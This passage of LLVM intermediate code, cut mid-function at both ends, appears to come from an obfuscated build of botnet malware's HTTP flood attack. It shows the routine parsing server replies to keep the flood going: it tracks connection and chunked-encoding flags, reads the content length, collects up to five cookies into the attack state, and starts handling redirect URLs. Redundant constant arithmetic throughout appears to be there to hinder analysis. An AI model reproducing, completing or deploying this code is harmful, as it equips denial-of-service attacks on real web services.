  %1304 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1303, i32 0, i32 11
  store i32 1, i32* %1304, align 4
  br label %1305

; <label>:1305:                                   ; preds = %1302, %1296
  %1306 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1307 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1306, i32 0, i32 12
  store i32 0, i32* %1307, align 4
  %1308 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i32 0, i32 0
  %1309 = load i32, i32* %12, align 4
  %1310 = call i8* @table_retrieve_val(i32 69, i32* null)
  %1311 = call i32 @util_stristr(i8* %1308, i32 %1309, i8* %1310)
  %1312 = icmp ne i32 %1311, -1
  br i1 %1312, label %1313, label %1374

; <label>:1313:                                   ; preds = %1305
  %1314 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i32 0, i32 0
  %1315 = load i32, i32* %12, align 4
  %1316 = call i8* @table_retrieve_val(i32 69, i32* null)
  %1317 = call i32 @util_stristr(i8* %1314, i32 %1315, i8* %1316)
  store i32 %1317, i32* %38, align 4
  %1318 = load i32, i32* %38, align 4
  %1319 = sext i32 %1318 to i64
  %1320 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i64 0, i64 %1319
  %1321 = load i8, i8* %1320, align 1
  %1322 = sext i8 %1321 to i32
  %1323 = icmp eq i32 %1322, 32
  br i1 %1323, label %1324, label %1331

; <label>:1324:                                   ; preds = %1313
  %1325 = load i32, i32* %38, align 4
  %1326 = sub i32 0, %1325
  %1327 = sub i32 0, 1
  %1328 = add i32 %1326, %1327
  %1329 = sub i32 0, %1328
  %1330 = add nsw i32 %1325, 1
  store i32 %1329, i32* %38, align 4
  br label %1331

; <label>:1331:                                   ; preds = %1324, %1313
  %1332 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i32 0, i32 0
  %1333 = load i32, i32* %38, align 4
  %1334 = sext i32 %1333 to i64
  %1335 = getelementptr inbounds i8, i8* %1332, i64 %1334
  %1336 = load i32, i32* %12, align 4
  %1337 = load i32, i32* %38, align 4
  %1338 = sub i32 0, %1337
  %1339 = add i32 %1336, %1338
  %1340 = sub nsw i32 %1336, %1337
  %1341 = call i32 @util_memsearch(i8* %1335, i32 %1339, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.5, i32 0, i32 0), i32 2)
  store i32 %1341, i32* %39, align 4
  %1342 = load i32, i32* %39, align 4
  %1343 = icmp ne i32 %1342, -1
  br i1 %1343, label %1344, label %1373

; <label>:1344:                                   ; preds = %1331
  %1345 = load i32, i32* %38, align 4
  %1346 = sext i32 %1345 to i64
  %1347 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i64 0, i64 %1346
  store i8* %1347, i8** %40, align 8
  %1348 = load i32, i32* %39, align 4
  %1349 = icmp sge i32 %1348, 2
  br i1 %1349, label %1350, label %1355

; <label>:1350:                                   ; preds = %1344
  %1351 = load i32, i32* %39, align 4
  %1352 = sub i32 0, 2
  %1353 = add i32 %1351, %1352
  %1354 = sub nsw i32 %1351, 2
  store i32 %1353, i32* %39, align 4
  br label %1355

; <label>:1355:                                   ; preds = %1350, %1344
  %1356 = load i32, i32* %38, align 4
  %1357 = load i32, i32* %39, align 4
  %1358 = sub i32 0, %1357
  %1359 = sub i32 %1356, %1358
  %1360 = add nsw i32 %1356, %1357
  %1361 = sext i32 %1359 to i64
  %1362 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i64 0, i64 %1361
  store i8 0, i8* %1362, align 1
  %1363 = load i8*, i8** %40, align 8
  %1364 = load i8*, i8** %40, align 8
  %1365 = call i32 @util_strlen(i8* %1364)
  %1366 = call i8* @table_retrieve_val(i32 68, i32* null)
  %1367 = call i32 @util_stristr(i8* %1363, i32 %1365, i8* %1366)
  %1368 = icmp ne i32 %1367, 0
  br i1 %1368, label %1369, label %1372

; <label>:1369:                                   ; preds = %1355
  %1370 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1371 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1370, i32 0, i32 12
  store i32 1, i32* %1371, align 4
  br label %1372

; <label>:1372:                                   ; preds = %1369, %1355
  br label %1373

; <label>:1373:                                   ; preds = %1372, %1331
  br label %1374

; <label>:1374:                                   ; preds = %1373, %1305
  %1375 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1376 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1375, i32 0, i32 13
  store i32 0, i32* %1376, align 4
  %1377 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i32 0, i32 0
  %1378 = load i32, i32* %12, align 4
  %1379 = call i8* @table_retrieve_val(i32 66, i32* null)
  %1380 = call i32 @util_stristr(i8* %1377, i32 %1378, i8* %1379)
  %1381 = icmp ne i32 %1380, -1
  br i1 %1381, label %1382, label %1442

; <label>:1382:                                   ; preds = %1374
  %1383 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i32 0, i32 0
  %1384 = load i32, i32* %12, align 4
  %1385 = call i8* @table_retrieve_val(i32 66, i32* null)
  %1386 = call i32 @util_stristr(i8* %1383, i32 %1384, i8* %1385)
  store i32 %1386, i32* %41, align 4
  %1387 = load i32, i32* %41, align 4
  %1388 = sext i32 %1387 to i64
  %1389 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i64 0, i64 %1388
  %1390 = load i8, i8* %1389, align 1
  %1391 = sext i8 %1390 to i32
  %1392 = icmp eq i32 %1391, 32
  br i1 %1392, label %1393, label %1398

; <label>:1393:                                   ; preds = %1382
  %1394 = load i32, i32* %41, align 4
  %1395 = sub i32 0, 1
  %1396 = sub i32 %1394, %1395
  %1397 = add nsw i32 %1394, 1
  store i32 %1396, i32* %41, align 4
  br label %1398

; <label>:1398:                                   ; preds = %1393, %1382
  %1399 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i32 0, i32 0
  %1400 = load i32, i32* %41, align 4
  %1401 = sext i32 %1400 to i64
  %1402 = getelementptr inbounds i8, i8* %1399, i64 %1401
  %1403 = load i32, i32* %12, align 4
  %1404 = load i32, i32* %41, align 4
  %1405 = sub i32 0, %1404
  %1406 = add i32 %1403, %1405
  %1407 = sub nsw i32 %1403, %1404
  %1408 = call i32 @util_memsearch(i8* %1402, i32 %1406, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.5, i32 0, i32 0), i32 2)
  store i32 %1408, i32* %42, align 4
  %1409 = load i32, i32* %42, align 4
  %1410 = icmp ne i32 %1409, -1
  br i1 %1410, label %1411, label %1441

; <label>:1411:                                   ; preds = %1398
  %1412 = load i32, i32* %41, align 4
  %1413 = sext i32 %1412 to i64
  %1414 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i64 0, i64 %1413
  store i8* %1414, i8** %43, align 8
  %1415 = load i32, i32* %42, align 4
  %1416 = icmp sge i32 %1415, 2
  br i1 %1416, label %1417, label %1422

; <label>:1417:                                   ; preds = %1411
  %1418 = load i32, i32* %42, align 4
  %1419 = sub i32 0, 2
  %1420 = add i32 %1418, %1419
  %1421 = sub nsw i32 %1418, 2
  store i32 %1420, i32* %42, align 4
  br label %1422

; <label>:1422:                                   ; preds = %1417, %1411
  %1423 = load i32, i32* %41, align 4
  %1424 = load i32, i32* %42, align 4
  %1425 = add i32 %1423, -1269538043
  %1426 = add i32 %1425, %1424
  %1427 = sub i32 %1426, -1269538043
  %1428 = add nsw i32 %1423, %1424
  %1429 = sext i32 %1427 to i64
  %1430 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i64 0, i64 %1429
  store i8 0, i8* %1430, align 1
  %1431 = load i8*, i8** %43, align 8
  %1432 = load i8*, i8** %43, align 8
  %1433 = call i32 @util_strlen(i8* %1432)
  %1434 = call i8* @table_retrieve_val(i32 67, i32* null)
  %1435 = call i32 @util_stristr(i8* %1431, i32 %1433, i8* %1434)
  %1436 = icmp ne i32 %1435, 0
  br i1 %1436, label %1437, label %1440

; <label>:1437:                                   ; preds = %1422
  %1438 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1439 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1438, i32 0, i32 13
  store i32 1, i32* %1439, align 4
  br label %1440

; <label>:1440:                                   ; preds = %1437, %1422
  br label %1441

; <label>:1441:                                   ; preds = %1440, %1398
  br label %1442

; <label>:1442:                                   ; preds = %1441, %1374
  %1443 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i32 0, i32 0
  %1444 = load i32, i32* %12, align 4
  %1445 = call i8* @table_retrieve_val(i32 65, i32* null)
  %1446 = call i32 @util_stristr(i8* %1443, i32 %1444, i8* %1445)
  %1447 = icmp ne i32 %1446, -1
  br i1 %1447, label %1448, label %1504

; <label>:1448:                                   ; preds = %1442
  %1449 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i32 0, i32 0
  %1450 = load i32, i32* %12, align 4
  %1451 = call i8* @table_retrieve_val(i32 65, i32* null)
  %1452 = call i32 @util_stristr(i8* %1449, i32 %1450, i8* %1451)
  store i32 %1452, i32* %44, align 4
  %1453 = load i32, i32* %44, align 4
  %1454 = sext i32 %1453 to i64
  %1455 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i64 0, i64 %1454
  %1456 = load i8, i8* %1455, align 1
  %1457 = sext i8 %1456 to i32
  %1458 = icmp eq i32 %1457, 32
  br i1 %1458, label %1459, label %1464

; <label>:1459:                                   ; preds = %1448
  %1460 = load i32, i32* %44, align 4
  %1461 = sub i32 0, 1
  %1462 = sub i32 %1460, %1461
  %1463 = add nsw i32 %1460, 1
  store i32 %1462, i32* %44, align 4
  br label %1464

; <label>:1464:                                   ; preds = %1459, %1448
  %1465 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i32 0, i32 0
  %1466 = load i32, i32* %44, align 4
  %1467 = sext i32 %1466 to i64
  %1468 = getelementptr inbounds i8, i8* %1465, i64 %1467
  %1469 = load i32, i32* %12, align 4
  %1470 = load i32, i32* %44, align 4
  %1471 = sub i32 %1469, 778574991
  %1472 = sub i32 %1471, %1470
  %1473 = add i32 %1472, 778574991
  %1474 = sub nsw i32 %1469, %1470
  %1475 = call i32 @util_memsearch(i8* %1468, i32 %1473, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.5, i32 0, i32 0), i32 2)
  store i32 %1475, i32* %45, align 4
  %1476 = load i32, i32* %45, align 4
  %1477 = icmp ne i32 %1476, -1
  br i1 %1477, label %1478, label %1503

; <label>:1478:                                   ; preds = %1464
  %1479 = load i32, i32* %44, align 4
  %1480 = sext i32 %1479 to i64
  %1481 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i64 0, i64 %1480
  store i8* %1481, i8** %46, align 8
  %1482 = load i32, i32* %45, align 4
  %1483 = icmp sge i32 %1482, 2
  br i1 %1483, label %1484, label %1490

; <label>:1484:                                   ; preds = %1478
  %1485 = load i32, i32* %45, align 4
  %1486 = sub i32 %1485, -609121105
  %1487 = sub i32 %1486, 2
  %1488 = add i32 %1487, -609121105
  %1489 = sub nsw i32 %1485, 2
  store i32 %1488, i32* %45, align 4
  br label %1490

; <label>:1490:                                   ; preds = %1484, %1478
  %1491 = load i32, i32* %44, align 4
  %1492 = load i32, i32* %45, align 4
  %1493 = sub i32 %1491, -1926252004
  %1494 = add i32 %1493, %1492
  %1495 = add i32 %1494, -1926252004
  %1496 = add nsw i32 %1491, %1492
  %1497 = sext i32 %1495 to i64
  %1498 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i64 0, i64 %1497
  store i8 0, i8* %1498, align 1
  %1499 = load i8*, i8** %46, align 8
  %1500 = call i32 @util_atoi(i8* %1499, i32 10)
  %1501 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1502 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1501, i32 0, i32 14
  store i32 %1500, i32* %1502, align 4
  br label %1503

; <label>:1503:                                   ; preds = %1490, %1464
  br label %1507

; <label>:1504:                                   ; preds = %1442
  %1505 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1506 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1505, i32 0, i32 14
  store i32 0, i32* %1506, align 4
  br label %1507

; <label>:1507:                                   ; preds = %1504, %1503
  store i32 0, i32* %37, align 4
  br label %1508

; <label>:1508:                                   ; preds = %1730, %1507
  %1509 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i32 0, i32 0
  %1510 = load i32, i32* %37, align 4
  %1511 = sext i32 %1510 to i64
  %1512 = getelementptr inbounds i8, i8* %1509, i64 %1511
  %1513 = load i32, i32* %12, align 4
  %1514 = call i8* @table_retrieve_val(i32 64, i32* null)
  %1515 = call i32 @util_stristr(i8* %1512, i32 %1513, i8* %1514)
  %1516 = icmp ne i32 %1515, -1
  br i1 %1516, label %1517, label %1522

; <label>:1517:                                   ; preds = %1508
  %1518 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1519 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1518, i32 0, i32 15
  %1520 = load i32, i32* %1519, align 4
  %1521 = icmp slt i32 %1520, 5
  br label %1522

; <label>:1522:                                   ; preds = %1517, %1508
  %1523 = phi i1 [ false, %1508 ], [ %1521, %1517 ]
  br i1 %1523, label %1524, label %1738

; <label>:1524:                                   ; preds = %1522
  %1525 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i32 0, i32 0
  %1526 = load i32, i32* %37, align 4
  %1527 = sext i32 %1526 to i64
  %1528 = getelementptr inbounds i8, i8* %1525, i64 %1527
  %1529 = load i32, i32* %12, align 4
  %1530 = call i8* @table_retrieve_val(i32 64, i32* null)
  %1531 = call i32 @util_stristr(i8* %1528, i32 %1529, i8* %1530)
  store i32 %1531, i32* %47, align 4
  %1532 = load i32, i32* %37, align 4
  %1533 = load i32, i32* %47, align 4
  %1534 = add i32 %1532, 1832652424
  %1535 = add i32 %1534, %1533
  %1536 = sub i32 %1535, 1832652424
  %1537 = add nsw i32 %1532, %1533
  %1538 = sext i32 %1536 to i64
  %1539 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i64 0, i64 %1538
  %1540 = load i8, i8* %1539, align 1
  %1541 = sext i8 %1540 to i32
  %1542 = icmp eq i32 %1541, 32
  br i1 %1542, label %1543, label %1549

; <label>:1543:                                   ; preds = %1524
  %1544 = load i32, i32* %47, align 4
  %1545 = add i32 %1544, -741483069
  %1546 = add i32 %1545, 1
  %1547 = sub i32 %1546, -741483069
  %1548 = add nsw i32 %1544, 1
  store i32 %1547, i32* %47, align 4
  br label %1549

; <label>:1549:                                   ; preds = %1543, %1524
  %1550 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i32 0, i32 0
  %1551 = load i32, i32* %37, align 4
  %1552 = sext i32 %1551 to i64
  %1553 = getelementptr inbounds i8, i8* %1550, i64 %1552
  %1554 = load i32, i32* %47, align 4
  %1555 = sext i32 %1554 to i64
  %1556 = getelementptr inbounds i8, i8* %1553, i64 %1555
  %1557 = load i32, i32* %12, align 4
  %1558 = load i32, i32* %37, align 4
  %1559 = add i32 %1557, 960052104
  %1560 = sub i32 %1559, %1558
  %1561 = sub i32 %1560, 960052104
  %1562 = sub nsw i32 %1557, %1558
  %1563 = load i32, i32* %47, align 4
  %1564 = add i32 %1561, -1640844642
  %1565 = sub i32 %1564, %1563
  %1566 = sub i32 %1565, -1640844642
  %1567 = sub nsw i32 %1561, %1563
  %1568 = call i32 @util_memsearch(i8* %1556, i32 %1566, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.5, i32 0, i32 0), i32 2)
  store i32 %1568, i32* %48, align 4
  %1569 = load i32, i32* %48, align 4
  %1570 = icmp ne i32 %1569, -1
  br i1 %1570, label %1571, label %1730

; <label>:1571:                                   ; preds = %1549
  %1572 = load i32, i32* %37, align 4
  %1573 = load i32, i32* %47, align 4
  %1574 = sub i32 %1572, -1834131651
  %1575 = add i32 %1574, %1573
  %1576 = add i32 %1575, -1834131651
  %1577 = add nsw i32 %1572, %1573
  %1578 = sext i32 %1576 to i64
  %1579 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i64 0, i64 %1578
  store i8* %1579, i8** %49, align 8
  %1580 = load i32, i32* %48, align 4
  %1581 = icmp sge i32 %1580, 2
  br i1 %1581, label %1582, label %1588

; <label>:1582:                                   ; preds = %1571
  %1583 = load i32, i32* %48, align 4
  %1584 = sub i32 %1583, -647794812
  %1585 = sub i32 %1584, 2
  %1586 = add i32 %1585, -647794812
  %1587 = sub nsw i32 %1583, 2
  store i32 %1586, i32* %48, align 4
  br label %1588

; <label>:1588:                                   ; preds = %1582, %1571
  %1589 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i32 0, i32 0
  %1590 = load i32, i32* %37, align 4
  %1591 = sext i32 %1590 to i64
  %1592 = getelementptr inbounds i8, i8* %1589, i64 %1591
  %1593 = load i32, i32* %47, align 4
  %1594 = sext i32 %1593 to i64
  %1595 = getelementptr inbounds i8, i8* %1592, i64 %1594
  %1596 = load i32, i32* %12, align 4
  %1597 = load i32, i32* %37, align 4
  %1598 = add i32 %1596, -2050495709
  %1599 = sub i32 %1598, %1597
  %1600 = sub i32 %1599, -2050495709
  %1601 = sub nsw i32 %1596, %1597
  %1602 = load i32, i32* %47, align 4
  %1603 = sub i32 %1600, -1840962162
  %1604 = sub i32 %1603, %1602
  %1605 = add i32 %1604, -1840962162
  %1606 = sub nsw i32 %1600, %1602
  %1607 = call i32 @util_memsearch(i8* %1595, i32 %1605, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.9, i32 0, i32 0), i32 1)
  %1608 = icmp sgt i32 %1607, 0
  br i1 %1608, label %1609, label %1632

; <label>:1609:                                   ; preds = %1588
  %1610 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i32 0, i32 0
  %1611 = load i32, i32* %37, align 4
  %1612 = sext i32 %1611 to i64
  %1613 = getelementptr inbounds i8, i8* %1610, i64 %1612
  %1614 = load i32, i32* %47, align 4
  %1615 = sext i32 %1614 to i64
  %1616 = getelementptr inbounds i8, i8* %1613, i64 %1615
  %1617 = load i32, i32* %12, align 4
  %1618 = load i32, i32* %37, align 4
  %1619 = add i32 %1617, 215275388
  %1620 = sub i32 %1619, %1618
  %1621 = sub i32 %1620, 215275388
  %1622 = sub nsw i32 %1617, %1618
  %1623 = load i32, i32* %47, align 4
  %1624 = add i32 %1621, 416138451
  %1625 = sub i32 %1624, %1623
  %1626 = sub i32 %1625, 416138451
  %1627 = sub nsw i32 %1621, %1623
  %1628 = call i32 @util_memsearch(i8* %1616, i32 %1626, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.9, i32 0, i32 0), i32 1)
  %1629 = sub i32 0, 1
  %1630 = add i32 %1628, %1629
  %1631 = sub nsw i32 %1628, 1
  store i32 %1630, i32* %48, align 4
  br label %1632

; <label>:1632:                                   ; preds = %1609, %1588
  %1633 = load i32, i32* %37, align 4
  %1634 = load i32, i32* %47, align 4
  %1635 = sub i32 0, %1634
  %1636 = sub i32 %1633, %1635
  %1637 = add nsw i32 %1633, %1634
  %1638 = load i32, i32* %48, align 4
  %1639 = add i32 %1636, 699517378
  %1640 = add i32 %1639, %1638
  %1641 = sub i32 %1640, 699517378
  %1642 = add nsw i32 %1636, %1638
  %1643 = sext i32 %1641 to i64
  %1644 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i64 0, i64 %1643
  store i8 0, i8* %1644, align 1
  store i32 0, i32* %10, align 4
  br label %1645

; <label>:1645:                                   ; preds = %1660, %1632
  %1646 = load i32, i32* %10, align 4
  %1647 = load i8*, i8** %49, align 8
  %1648 = call i32 @util_strlen(i8* %1647)
  %1649 = icmp slt i32 %1646, %1648
  br i1 %1649, label %1650, label %1665

; <label>:1650:                                   ; preds = %1645
  %1651 = load i8*, i8** %49, align 8
  %1652 = load i32, i32* %10, align 4
  %1653 = sext i32 %1652 to i64
  %1654 = getelementptr inbounds i8, i8* %1651, i64 %1653
  %1655 = load i8, i8* %1654, align 1
  %1656 = sext i8 %1655 to i32
  %1657 = icmp eq i32 %1656, 61
  br i1 %1657, label %1658, label %1659

; <label>:1658:                                   ; preds = %1650
  br label %1665

; <label>:1659:                                   ; preds = %1650
  br label %1660

; <label>:1660:                                   ; preds = %1659
  %1661 = load i32, i32* %10, align 4
  %1662 = sub i32 0, 1
  %1663 = sub i32 %1661, %1662
  %1664 = add nsw i32 %1661, 1
  store i32 %1663, i32* %10, align 4
  br label %1645

; <label>:1665:                                   ; preds = %1658, %1645
  %1666 = load i8*, i8** %49, align 8
  %1667 = load i32, i32* %10, align 4
  %1668 = sext i32 %1667 to i64
  %1669 = getelementptr inbounds i8, i8* %1666, i64 %1668
  %1670 = load i8, i8* %1669, align 1
  %1671 = sext i8 %1670 to i32
  %1672 = icmp eq i32 %1671, 61
  br i1 %1672, label %1673, label %1729

; <label>:1673:                                   ; preds = %1665
  %1674 = load i32, i32* %10, align 4
  store i32 %1674, i32* %50, align 4
  store i32 0, i32* %51, align 4
  store i32 0, i32* %10, align 4
  br label %1675

; <label>:1675:                                   ; preds = %1694, %1673
  %1676 = load i32, i32* %10, align 4
  %1677 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1678 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1677, i32 0, i32 15
  %1679 = load i32, i32* %1678, align 4
  %1680 = icmp slt i32 %1676, %1679
  br i1 %1680, label %1681, label %1701

; <label>:1681:                                   ; preds = %1675
  %1682 = load i8*, i8** %49, align 8
  %1683 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1684 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1683, i32 0, i32 16
  %1685 = load i32, i32* %10, align 4
  %1686 = sext i32 %1685 to i64
  %1687 = getelementptr inbounds [5 x [128 x i8]], [5 x [128 x i8]]* %1684, i64 0, i64 %1686
  %1688 = getelementptr inbounds [128 x i8], [128 x i8]* %1687, i32 0, i32 0
  %1689 = load i32, i32* %50, align 4
  %1690 = call signext i8 @util_strncmp(i8* %1682, i8* %1688, i32 %1689)
  %1691 = icmp ne i8 %1690, 0
  br i1 %1691, label %1692, label %1693

; <label>:1692:                                   ; preds = %1681
  store i32 1, i32* %51, align 4
  br label %1701

; <label>:1693:                                   ; preds = %1681
  br label %1694

; <label>:1694:                                   ; preds = %1693
  %1695 = load i32, i32* %10, align 4
  %1696 = sub i32 0, %1695
  %1697 = sub i32 0, 1
  %1698 = add i32 %1696, %1697
  %1699 = sub i32 0, %1698
  %1700 = add nsw i32 %1695, 1
  store i32 %1699, i32* %10, align 4
  br label %1675

; <label>:1701:                                   ; preds = %1692, %1675
  %1702 = load i32, i32* %51, align 4
  %1703 = icmp ne i32 %1702, 0
  br i1 %1703, label %1728, label %1704

; <label>:1704:                                   ; preds = %1701
  %1705 = load i8*, i8** %49, align 8
  %1706 = call i32 @util_strlen(i8* %1705)
  %1707 = icmp slt i32 %1706, 128
  br i1 %1707, label %1708, label %1727

; <label>:1708:                                   ; preds = %1704
  %1709 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1710 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1709, i32 0, i32 16
  %1711 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1712 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1711, i32 0, i32 15
  %1713 = load i32, i32* %1712, align 4
  %1714 = sext i32 %1713 to i64
  %1715 = getelementptr inbounds [5 x [128 x i8]], [5 x [128 x i8]]* %1710, i64 0, i64 %1714
  %1716 = getelementptr inbounds [128 x i8], [128 x i8]* %1715, i32 0, i32 0
  %1717 = load i8*, i8** %49, align 8
  %1718 = call i32 @util_strcpy(i8* %1716, i8* %1717)
  %1719 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1720 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1719, i32 0, i32 15
  %1721 = load i32, i32* %1720, align 4
  %1722 = sub i32 0, %1721
  %1723 = sub i32 0, 1
  %1724 = add i32 %1722, %1723
  %1725 = sub i32 0, %1724
  %1726 = add nsw i32 %1721, 1
  store i32 %1725, i32* %1720, align 4
  br label %1727

; <label>:1727:                                   ; preds = %1708, %1704
  br label %1728

; <label>:1728:                                   ; preds = %1727, %1701
  br label %1729

; <label>:1729:                                   ; preds = %1728, %1665
  br label %1730

; <label>:1730:                                   ; preds = %1729, %1549
  %1731 = load i32, i32* %47, align 4
  %1732 = load i32, i32* %37, align 4
  %1733 = sub i32 0, %1732
  %1734 = sub i32 0, %1731
  %1735 = add i32 %1733, %1734
  %1736 = sub i32 0, %1735
  %1737 = add nsw i32 %1732, %1731
  store i32 %1736, i32* %37, align 4
  br label %1508

; <label>:1738:                                   ; preds = %1522
  %1739 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i32 0, i32 0
  %1740 = load i32, i32* %12, align 4
  %1741 = call i8* @table_retrieve_val(i32 63, i32* null)
  %1742 = call i32 @util_stristr(i8* %1739, i32 %1740, i8* %1741)
  %1743 = icmp ne i32 %1742, -1
  br i1 %1743, label %1744, label %1963

; <label>:1744:                                   ; preds = %1738
  %1745 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i32 0, i32 0
  %1746 = load i32, i32* %12, align 4
  %1747 = call i8* @table_retrieve_val(i32 63, i32* null)
  %1748 = call i32 @util_stristr(i8* %1745, i32 %1746, i8* %1747)
  store i32 %1748, i32* %52, align 4
  %1749 = load i32, i32* %52, align 4
  %1750 = sext i32 %1749 to i64
  %1751 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i64 0, i64 %1750
  %1752 = load i8, i8* %1751, align 1
  %1753 = sext i8 %1752 to i32
  %1754 = icmp eq i32 %1753, 32
  br i1 %1754, label %1755, label %1760

; <label>:1755:                                   ; preds = %1744
  %1756 = load i32, i32* %52, align 4
  %1757 = sub i32 0, 1
  %1758 = sub i32 %1756, %1757
  %1759 = add nsw i32 %1756, 1
  store i32 %1758, i32* %52, align 4
  br label %1760

; <label>:1760:                                   ; preds = %1755, %1744
  %1761 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i32 0, i32 0
  %1762 = load i32, i32* %52, align 4
  %1763 = sext i32 %1762 to i64
  %1764 = getelementptr inbounds i8, i8* %1761, i64 %1763
  %1765 = load i32, i32* %12, align 4
  %1766 = load i32, i32* %52, align 4
  %1767 = sub i32 %1765, 1671361069
  %1768 = sub i32 %1767, %1766
  %1769 = add i32 %1768, 1671361069
  %1770 = sub nsw i32 %1765, %1766
  %1771 = call i32 @util_memsearch(i8* %1764, i32 %1769, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.5, i32 0, i32 0), i32 2)
  store i32 %1771, i32* %53, align 4
  %1772 = load i32, i32* %53, align 4
  %1773 = icmp ne i32 %1772, -1
  br i1 %1773, label %1774, label %1962

; <label>:1774:                                   ; preds = %1760
  %1775 = load i32, i32* %52, align 4
  %1776 = sext i32 %1775 to i64
  %1777 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i64 0, i64 %1776
  store i8* %1777, i8** %54, align 8
  %1778 = load i32, i32* %53, align 4
  %1779 = icmp sge i32 %1778, 2
  br i1 %1779, label %1780, label %1786

; <label>:1780:                                   ; preds = %1774
  %1781 = load i32, i32* %53, align 4
  %1782 = add i32 %1781, 162312509
  %1783 = sub i32 %1782, 2
  %1784 = sub i32 %1783, 162312509
  %1785 = sub nsw i32 %1781, 2
  store i32 %1784, i32* %53, align 4
  br label %1786

; <label>:1786:                                   ; preds = %1780, %1774
  %1787 = load i32, i32* %52, align 4
  %1788 = load i32, i32* %53, align 4
  %1789 = add i32 %1787, 1040071607
  %1790 = add i32 %1789, %1788
  %1791 = sub i32 %1790, 1040071607
  %1792 = add nsw i32 %1787, %1788
  %1793 = sext i32 %1791 to i64
  %1794 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i64 0, i64 %1793
  store i8 0, i8* %1794, align 1
  %1795 = load i32, i32* %53, align 4
  %1796 = sub i32 0, 1
  %1797 = sub i32 %1795, %1796
  %1798 = add nsw i32 %1795, 1
  store i32 %1797, i32* %53, align 4
  %1799 = load i8*, i8** %54, align 8
  %1800 = load i32, i32* %53, align 4
  %1801 = call i32 @util_memsearch(i8* %1799, i32 %1800, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.10, i32 0, i32 0), i32 4)
  %1802 = icmp eq i32 %1801, 4
  br i1 %1802, label %1803, label %1910

; <label>:1803:                                   ; preds = %1786
  store i32 7, i32* %10, align 4
  %1804 = load i8*, i8** %54, align 8
  %1805 = getelementptr inbounds i8, i8* %1804, i64 4
  %1806 = load i8, i8* %1805, align 1
  %1807 = sext i8 %1806 to i32
  %1808 = icmp eq i32 %1807, 115
  br i1 %1808, label %1809, label %1815

; <label>:1809:                                   ; preds = %1803
  %1810 = load i32, i32* %10, align 4
  %1811 = add i32 %1810, 935027248
  %1812 = add i32 %1811, 1
  %1813 = sub i32 %1812, 935027248
  %1814 = add nsw i32 %1810, 1
  store i32 %1813, i32* %10, align 4
  br label %1815

; <label>:1815:                                   ; preds = %1809, %1803
  %1816 = load i8*, i8** %54, align 8
  %1817 = load i8*, i8** %54, align 8
  %1818 = load i32, i32* %10, align 4
  %1819 = sext i32 %1818 to i64
  %1820 = getelementptr inbounds i8, i8* %1817, i64 %1819
  %1821 = load i32, i32* %53, align 4
  %1822 = load i32, i32* %10, align 4
  %1823 = sub i32 %1821, 1239505924
  %1824 = sub i32 %1823, %1822
  %1825 = add i32 %1824, 1239505924
